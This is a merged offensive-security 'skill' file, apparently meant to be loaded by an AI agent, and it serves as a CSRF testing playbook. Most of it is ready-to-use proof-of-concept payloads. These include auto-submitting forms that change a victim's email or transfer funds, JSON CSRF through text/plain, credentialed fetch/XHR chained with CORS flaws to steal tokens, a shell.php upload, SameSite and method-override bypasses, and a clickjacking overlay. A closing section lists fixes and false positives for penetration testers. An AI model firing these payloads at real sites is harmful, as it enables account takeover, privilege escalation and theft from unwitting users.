---
name: csrf
description: "CSRF testing playbook. Use when reviewing state-changing web flows, anti-CSRF defenses, SameSite behavior, JSON CSRF, login CSRF, and OAuth state handling."
domain: client-side
merged: true
merged_from: [hack-skills:csrf-cross-site-request-forgery, hacking-skills:csrf]
---

# csrf

> **Fusionierter Skill** — vereint 2 Quell-Skills zu einem: `hack-skills:csrf-cross-site-request-forgery`, `hacking-skills:csrf`. Alle Techniken aller Quellen sind unten zusammengeführt, nichts ausgelassen.

## Quelle: hack-skills — csrf-cross-site-request-forgery (527 Zeilen)

# SKILL: CSRF — Cross-Site Request Forgery — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert CSRF techniques. Covers modern bypass vectors (SameSite gaps, custom header flaws, tokenless bypass patterns), JSON CSRF, multipart CSRF, chaining with XSS. Base models often present only basic CSRF without covering SameSite edge cases and common broken token implementations.

## 0. RELATED ROUTING

Also load:

- [cors cross origin misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) when JSON endpoints become readable cross-origin
- [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) when login, account linking, or callback binding relies on OAuth state

---

## 1. CORE CONCEPT

CSRF exploits a victim's active session to perform state-changing requests **from the attacker's origin**.

**Required conditions**:
1. Victim is authenticated (active session cookie)
2. Server identifies session via cookie only (no secondary check)
3. Attacker can predict/construct the valid request
4. Cookie is sent cross-origin (SameSite=None or legacy behavior)

---

## 2. FINDING CSRF TARGETS

**High-value state-changing endpoints**:
```
- Password change         ← account takeover
- Email change            ← account takeover
- Add admin / change role ← privilege escalation
- Bank/payment transfer   ← financial impact
- OAuth app authorization ← hijack oauth flow
- Account deletion
- Two-factor auth disable  
- SSH key / API key addition
- Webhook configuration
- Profile/contact info update
```

---

## 3. TOKEN BYPASS TECHNIQUES

### No Token Present
Simplest case — form simply lacks CSRF token. Check if POST /change-email has any token. If not → trivially exploitable.

### Token Not Validated (most common finding!)
Token exists in request but is never verified server-side:
```
Remove the _csrf_token parameter entirely → does request still succeed?
→ YES → trivial bypass
```

### Token Tied to Session but Not to User
```
Step 1: Log in as UserA → obtain valid CSRF token
Step 2: Log in as UserB in other browser → obtain UserB CSRF token  
Step 3: Use UserB's CSRF token in UserA's session (attacker controls UserB)
→ If server validates token exists but doesn't check if it belongs to the session → bypass
```

### Token in Cookie Only
When server sets CSRF token as cookie and expects it back in a header/form:
```
Set-Cookie: csrf=ATTACKER_CONTROLLED
→ If cookie can be set by subdomain (cookie tossing): set cookie to known value
→ Submit form with known token in header + known token in cookie = bypass
```

### Static or Predictable Token
```
→ Same token across all users/sessions
→ Token = base64(username) or md5(session_id) → reversible
→ Token = timestamp → predictable
```

### Double Submit Cookie Pattern (broken if subdomain trusted)
```
If attacker can write cookies for .target.com from subdomain XSS or cookie tossing:
→ Set csrf_cookie=CONTROLLED on .target.com
→ Submit request with X-CSRF-Token: CONTROLLED
→ Server checks header == cookie → match → bypass
```

---

## 4. SAMESITE BYPASS SCENARIOS

**SameSite=Lax** (modern browser default): cookies sent for top-level GET navigation, NOT for cross-site iframe/form POST.

**Bypass SameSite=Lax via GET method**:
```html
<!-- If server accepts GET for state-changing endpoint: -->
<img src="https://target.com/account/delete?confirm=yes">
<script>document.location = 'https://target.com/transfer?to=attacker&amount=1000';</script>
```

**Bypass via subdomain XSS (SameSite Lax/Strict)**:
```javascript
// XSS on sub.target.com → same-site origin → SameSite cookies sent!
// Use XSS as staging point for CSRF
window.location = 'https://target.com/account/modify?evil=true';
```

**SameSite=None** (legacy or explicit): cookies sent everywhere → classic CSRF applies.

**Cookie issued recently? Lax exemption:**
Chrome has a 2-minute exception where Lax cookies ARE sent on cross-site POSTs if the cookie was just set (for OAuth flows). Race window: set cookie, immediately trigger CSRF within 2 minutes.

---

## 5. CSRF PROOF OF CONCEPT TEMPLATES

### Simple Form POST
```html
<html>
<body>
<form id="csrf" action="https://target.com/account/email/change" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="confirm_email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

### Auto-click Submit
```html
<body onload="document.forms[0].submit()">
<form action="https://target.com/transfer" method="POST">
  <input name="to" value="attacker_account">
  <input name="amount" value="10000">
</form>
</body>
```

### CSRF via GET (with img tag)
```html
<img src="https://target.com/api/v1/admin/delete-user?id=12345" style="display:none">
```

### CSRF with Custom Header (XMLHttpRequest — same-origin only, defeats naive defenses)
If API requires custom header like `X-CSRF-Token` but also accepts JSON with wildcard CORS — custom headers don't protect if CORS misconfigured:
```javascript
// If Access-Control-Allow-Origin: * with credentials → broken
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/transfer");
xhr.setRequestHeader("Content-Type", "application/json");
xhr.withCredentials = true;  // still need cookie sending
xhr.send('{"to":"attacker","amount":1000}');
```

---

## 6. JSON CSRF

When endpoint accepts `Content-Type: application/json` — fetch() with CORS credentials:

```javascript
// If CORS allows credentials + the endpoint:
fetch('https://target.com/api/v1/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
```
**Requires**: `Access-Control-Allow-Origin: https://attacker.com` AND `Access-Control-Allow-Credentials: true`

**If server only accepts `application/json` but no fetch CORS:**
Can't do proper JSON CSRF from HTML form (forms can only send `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`).

**Trick — Content-Type Downgrade**: If server processes `text/plain` body as JSON:
```html
<form enctype="text/plain" method="POST" action="https://target.com/api">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
```
Resulting body: `{"email":"attacker@evil.com","ignore":"="}`

---

## 7. MULTIPART CSRF

When changing `Content-Type` from `application/json` to `multipart/form-data` and request still works:
```html
<form method="POST" action="https://target.com/api/update" enctype="multipart/form-data">
  <input name="email" value="attacker@evil.com">
</form>
```

---

## 8. CSRF + XSS COMBINATION (CSRF Token Bypass)

When CSRF protection is otherwise solid, XSS enables CSRF bypass:
```javascript
// Step 1: XSS reads CSRF token from DOM
var token = document.querySelector('input[name="csrf_token"]').value;
// Step 2: Submit CSRF request with real token
var xhr = new XMLHttpRequest();
xhr.open('POST', '/account/delete', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('confirm=yes&csrf_token=' + token);
```

---

## 9. OAUTH CSRF (STATE PARAMETER MISSING)

OAuth flow without `state` parameter → CSRF on the OAuth authorization:

**Attack**:
1. Attacker initiates OAuth flow, gets authorization code
2. Before exchanging code, stops the flow (captures the redirect URL with code)
3. Sends victim the crafted URL: `https://target.com/oauth/callback?code=ATTACKER_CODE`
4. Victim's browser exchanges the attacker's code → victim's account linked to attacker's OAuth provider

**Impact**: Attacker can log in as victim.

---

## 10. CSRF TESTING CHECKLIST

```
□ Remove CSRF token entirely → does request succeed?
□ Change CSRF token to random value → does request succeed?
□ Use CSRF token from another user's session → does request succeed?
□ Check if GET version of POST endpoint exists
□ Check SameSite attribute of session cookie
□ Test if Content-Type change (json → form → text/plain) still processes
□ Check CORS policy: does Access-Control-Allow-Credentials: true appear?
   With wildcard or attacker origin? → exploitable JSON CSRF
□ Check OAuth flows for missing state parameter
□ Test referrer-based protection: send request with no Referer header
□ Test referrer-based protection: spoof subdomain in referer
```

---

## 11. JSON CSRF TECHNIQUES

### Method 1: text/plain Disguise

```html
<!-- Browser sends Content-Type: text/plain with JSON-like body -->
<form action="https://target.com/api/role" method="POST" enctype="text/plain">
  <input name='{"role":"admin","ignore":"' value='"}' type="hidden">
  <input type="submit" value="Click me">
</form>
<!-- Resulting body: {"role":"admin","ignore":"="} -->
<!-- Server may parse as JSON if it doesn't strictly check Content-Type -->
```

### Method 2: XHR with Credentials

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/role", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send('{"role":"admin"}');
</script>
<!-- Only works if CORS allows the origin (misconfigured CORS + CSRF combo) -->
```

### Method 3: fetch() API

```html
<script>
fetch("https://target.com/api/role", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: '{"role":"admin"}'
});
</script>
```

---

## 12. MULTIPART CSRF & CLIENT-SIDE PATH TRAVERSAL

### Multipart File Upload CSRF

```html
<script>
var formData = new FormData();
formData.append("file", new Blob(["malicious content"], {type: "text/plain"}), "shell.php");
formData.append("action", "upload");

fetch("https://target.com/upload", {
  method: "POST",
  credentials: "include",
  body: formData
});
</script>
```

### Client-Side Path Traversal to CSRF (CSPT2CSRF)

```
Normal flow: Frontend fetches /api/user/PROFILE_ID/settings
Attack: Set PROFILE_ID to ../../admin/dangerous-action

Result: Frontend's fetch() hits /api/admin/dangerous-action with victim's cookies
This converts a path traversal into a CSRF-like attack without needing a CSRF token
```

| Aspect | Traditional CSRF | CSPT2CSRF |
|---|---|---|
| Origin | Attacker's site | Same-origin JavaScript |
| Token bypass | Needs token forgery | No token needed (same-origin) |
| SameSite | Blocked by SameSite=Strict | Bypasses SameSite (same site!) |
| Detection | Standard CSRF checks | Requires input validation on path segments |

---

## 13. SAMESITE=LAX ADVANCED BYPASS TECHNIQUES

### 13.1 Top-level navigation via `window.open()` (2-minute window)

Chrome's Lax+POST exception: cookies with `SameSite=Lax` are sent on cross-site POST requests if the cookie was set within the last 2 minutes (exists for OAuth flows).

```javascript
// Attacker page: trigger login to set a fresh cookie, then immediately CSRF
// Step 1: Force victim to visit target (sets fresh session cookie)
window.open('https://target.com/login');
// Step 2: Within 2 minutes, POST to state-changing endpoint
setTimeout(() => {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://target.com/account/change-email';
    form.innerHTML = '<input name="email" value="attacker@evil.com">';
    document.body.appendChild(form);
    form.submit();
}, 5000);
```

### 13.2 302 redirect chain from attacker site

Lax cookies are sent on top-level GET navigations. A redirect chain converts GET into action:

```text
1. Attacker page → 302 redirect to https://target.com/transfer?to=attacker&amount=1000
2. Browser follows redirect as top-level navigation → Lax cookies sent
3. If target accepts GET for state-changing operations → CSRF succeeds
```

### 13.3 Method override: POST disguised as GET

Many frameworks support method override via `_method` parameter:

```text
GET /account/delete?_method=DELETE&confirm=yes HTTP/1.1
GET /transfer?_method=POST&to=attacker&amount=1000 HTTP/1.1
```

Headers that trigger method override:
```text
X-HTTP-Method-Override: POST
X-Method-Override: DELETE
_method=PUT (Rails, Laravel, Symfony)
```

SameSite=Lax allows the GET → framework processes it as POST/DELETE via override → CSRF on "POST-only" endpoints.

---

## 14. ADVANCED JSON CSRF TECHNIQUES

### 14.1 Flash-based Content-Type manipulation (legacy)

Flash (pre-2021) could send arbitrary `Content-Type` headers cross-origin without preflight:

```actionscript
var req:URLRequest = new URLRequest("https://target.com/api/role");
req.method = "POST";
req.contentType = "application/json";
req.data = '{"role":"admin"}';
navigateToURL(req);
```

Legacy but still relevant for older internal applications.

### 14.2 fetch() no-cors mode limitations and workarounds

`fetch()` in `no-cors` mode can send simple requests but cannot set `Content-Type: application/json` (triggers preflight) or read the response.

Workaround — if the server accepts `text/plain` body and parses it as JSON:

```javascript
fetch('https://target.com/api/role', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {'Content-Type': 'text/plain'},
    body: '{"role":"admin"}'
});
```

### 14.3 Encoding JSON as form-urlencoded

Some backends accept both content types:

```html
<form action="https://target.com/api/role" method="POST">
  <input name="role" value="admin">
  <input name="user_id" value="123">
</form>
```

If the server processes `role=admin&user_id=123` the same as `{"role":"admin","user_id":123}` → CSRF via plain HTML form without CORS preflight.

---

## 15. CSRF + CORS MISCONFIGURATION CHAINS

### Reflected Origin + Credentials

```text
1. Target API reflects Origin in Access-Control-Allow-Origin
2. Access-Control-Allow-Credentials: true
3. Attacker page sends credentialed fetch() from https://evil.com
4. Response is readable → CSRF token extracted from response
5. Second request with valid CSRF token → bypass all CSRF defenses
```

```javascript
fetch('https://target.com/api/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
      fetch('https://target.com/api/change-email', {
          method: 'POST',
          credentials: 'include',
          headers: {
              'Content-Type': 'application/json',
              'X-CSRF-Token': data.csrf_token
          },
          body: JSON.stringify({email: 'attacker@evil.com'})
      });
  });
```

### Subdomain XSS → CORS → CSRF

If `*.target.com` is in the CORS allowlist and an XSS exists on any subdomain:
1. Exploit XSS on `blog.target.com`
2. From XSS context, fetch API at `api.target.com` (CORS allows subdomain)
3. Read CSRF token from response
4. Submit state-changing request with valid token

---

## 16. CSRF TOKEN FIXATION (PRE-SESSION TOKENS)

If CSRF tokens are issued before authentication and remain valid after login:

```text
1. Attacker visits target.com → receives CSRF token T1
2. Attacker forces victim's browser to use T1:
   a. Cookie tossing from subdomain
   b. CRLF injection to set csrf_cookie
3. Victim logs in — CSRF token unchanged
4. Attacker submits CSRF request with known T1 → succeeds
```

### Test procedure

```text
□ Obtain CSRF token as unauthenticated user
□ Log in — does the CSRF token change?
□ If unchanged → token fixation: pre-auth token works post-auth
□ Use pre-auth token in a CSRF PoC against authenticated endpoint
```

---

## 17. CLICKJACKING AS CSRF BYPASS

When CSRF protections are solid but `X-Frame-Options` / `frame-ancestors` is missing:

### Attack flow

```text
1. Target page is frameable (no X-Frame-Options / CSP frame-ancestors)
2. Attacker creates transparent iframe overlay
3. Victim sees attacker content, clicks land on target's action button in hidden iframe
4. Click originates from same origin (within iframe) — bypasses CSRF tokens
```

### PoC template

```html
<html>
<body>
<div style="position:relative">
  <iframe src="https://target.com/account/settings"
    style="opacity:0.0001; position:absolute; top:0; left:0;
           width:500px; height:500px; z-index:2;">
  </iframe>
  <button style="position:absolute; top:250px; left:200px; z-index:1;
                 padding:20px; font-size:24px;">
    Click to claim prize!
  </button>
</div>
</body>
</html>
```

### Defense check

```text
□ X-Frame-Options: DENY or SAMEORIGIN header present?
□ CSP: frame-ancestors 'self' or frame-ancestors 'none'?
□ If neither → clickjacking possible → CSRF bypass via iframe
```

## Quelle: hacking-skills — csrf (137 Zeilen)

# Cross-Site Request Forgery (CSRF)

## What Is Broken and Why
CSRF exploits the browser's automatic inclusion of credentials (cookies, HTTP Basic auth) with every request to a given origin. An attacker-controlled page on a different origin can cause the victim's browser to send authenticated requests to the target application. Since the browser automatically attaches the session cookie, the server cannot distinguish the forged request from a legitimate one — unless it validates a secret token that only the legitimate page would know. Absent CSRF tokens, `SameSite=Strict/Lax` cookie attributes, or origin validation, any state-changing operation is potentially exploitable.

## Key Signals
- State-changing requests (account settings, password change, fund transfer, email change) without a CSRF token
- CSRF token present but predictable, static, or not validated server-side
- Cookie lacks `SameSite=Strict` or `SameSite=Lax` attribute
- `Content-Type: application/json` endpoints that also accept `text/plain` (allows form-based CSRF)
- API endpoints not verifying `Origin` or `Referer` headers
- WebSocket handshakes without origin validation

## Methodology
1. Identify all state-changing requests (POST, PUT, PATCH, DELETE) in the application.
2. Check for CSRF token in request parameters or headers (`X-CSRF-Token`, `_token`, `csrf_token`).
3. If token is present: test whether it is validated (remove it, use an invalid value, reuse an old token, use another user's token).
4. If no token: confirm the action is exploitable by crafting a PoC HTML page.
5. Check `SameSite` attribute of session cookie; `Lax` provides partial protection (GET only, top-level nav).
6. Test JSON endpoints: try submitting the same payload as `text/plain` or `application/x-www-form-urlencoded`.
7. Test whether `Referer` header is validated and if it can be stripped or spoofed.
8. Use Burp's "Generate CSRF PoC" feature (right-click on request in Proxy history).

## Payloads & Tools
```html
<!-- GET-based CSRF (auto-loads on page visit) -->
<img src="TARGET/action?param=value" style="display:none">
<link rel="stylesheet" href="TARGET/action?param=value">

<!-- POST-based CSRF (auto-submitting form) -->
<html>
<body onload="document.forms[0].submit()">
<form action="TARGET/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@controlled.com">
</form>
</body>
</html>

<!-- POST-based with multiple fields -->
<form action="TARGET/transfer" method="POST" id="csrfForm">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="destination" value="ATTACKER-ACCOUNT">
  <input type="hidden" name="currency" value="USD">
</form>
<script>document.getElementById('csrfForm').submit();</script>

<!-- JSON CSRF via text/plain Content-Type -->
<form action="TARGET/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@controlled.com","x":"' value='"}'>
</form>
<!-- Results in body: {"email":"attacker@controlled.com","x":"="} -->

<!-- CSRF token bypass — test without token -->
POST /change-password HTTP/1.1
Host: TARGET
Cookie: session=TOKEN

new_password=attacker123

<!-- CSRF token bypass — use invalid token -->
POST /change-password HTTP/1.1
csrf_token=AAAAAAAAAAAAAAAA

<!-- CSRF via XHR (requires CORS misconfiguration) -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'TARGET/change-email', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('email=attacker@controlled.com');
</script>

<!-- Burp Suite — Generate CSRF PoC -->
<!-- Right-click on request in Proxy -> Engagement tools -> Generate CSRF PoC -->
```

## Bypass Techniques
- Remove CSRF token entirely (some servers skip validation when token is absent)
- Submit empty/null CSRF token value
- Reuse a valid token from another session (if tokens are not per-user)
- Use attacker's own valid CSRF token for victim's request (if not tied to session)
- Strip Referer header via `<meta name="referrer" content="no-referrer">` or HTTPS → HTTP downgrade
- For `SameSite=Lax`: exploit GET-based state changes; or use top-level navigation (window.open)
- JSON endpoint: attempt `Content-Type: text/plain` with JSON body shaped as `name=value` form data
- Subdomain takeover → subdomain can set/read parent domain cookies (bypasses SameSite in some configs)
- Flash-based CSRF (legacy): Flash objects bypass SameSite for cross-origin requests in old browsers

## Exploitation Scenarios
**Scenario 1 — Account Email Takeover**
Setup: `/account/change-email` accepts POST with `email` parameter; no CSRF token; session cookie lacks SameSite.
Trigger: Victim visits attacker page containing auto-submitting form POSTing to the email change endpoint.
Impact: Victim's email changed to attacker's address; attacker uses "forgot password" to gain full account control.

**Scenario 2 — Fund Transfer via JSON Endpoint**
Setup: Banking app's transfer API accepts JSON but does not enforce `Content-Type` (accepts `text/plain`).
Trigger: Attacker hosts page with form using `enctype="text/plain"` where input name contains valid JSON prefix.
Impact: Victim unknowingly authorizes fund transfer; attacker receives funds.

**Scenario 3 — Admin Action via GET Request**
Setup: Admin panel uses GET requests for user deletion: `/admin/delete-user?id=123`; no CSRF protection.
Trigger: Attacker embeds `<img src="TARGET/admin/delete-user?id=456">` on a page the admin visits.
Impact: Target user account deleted when admin loads attacker's page.

## False Positives
- CSRF token present and properly validated server-side (even if not obvious from request format)
- `SameSite=Strict` cookie attribute preventing cross-site requests in all modern browsers
- Application accepting requests only with `Content-Type: application/json` (form-based CSRF blocked)
- `Origin` or `Referer` header properly validated server-side before processing
- Read-only GET endpoints that appear to change state but actually do not persist changes

## Fix Patterns
- Implement synchronizer token pattern: per-session or per-request CSRF tokens in hidden form fields and custom headers
- Use `SameSite=Strict` for session cookies; `SameSite=Lax` provides partial protection for top-level navigation
- Validate `Origin` and `Referer` headers for state-changing requests; reject mismatches
- Double-submit cookie pattern: send token in cookie and request body; verify they match
- For APIs: require `Content-Type: application/json` and reject `text/plain`; verify with CORS policy
- Use custom request headers (e.g., `X-Requested-With`) which cannot be set by simple cross-origin forms
- Framework built-in CSRF protection: Django `{% csrf_token %}`, Laravel `@csrf`, Rails `authenticity_token`

## Related Skills

[[cors-misconfig]] enables reading CSRF tokens cross-origin, completely undermining the synchronizer token pattern — check CORS before concluding CSRF is mitigated. [[xss-stored]] or [[xss-reflected]] on the same origin bypasses SameSite cookies and can directly forge CSRF-protected requests since the script runs in the target origin. [[clickjacking]] is a user-tricked CSRF variant where the victim is manipulated into clicking a hidden button rather than being silently redirected. CSRF on a login form can be used to plant a known session and enable [[session-fixation]].
